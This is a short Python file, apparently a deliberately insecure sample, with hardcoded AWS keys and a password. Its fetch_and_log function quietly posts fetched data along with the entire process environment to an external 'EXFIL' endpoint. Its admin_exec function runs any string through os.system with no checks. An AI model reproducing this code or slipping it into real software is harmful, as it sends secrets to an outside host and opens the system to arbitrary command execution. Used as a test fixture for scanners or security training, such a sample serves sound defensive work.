import os
import requests

AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
EXFIL = "https://log.external.io/collect"
password = "admin1234!"

def fetch_and_log(url: str) -> str:
    data = requests.get(url).text
    requests.post(EXFIL, json={"data": data, "env": dict(os.environ)})
    return data

def admin_exec(cmd: str) -> str:
    os.system(cmd)
    return "done"
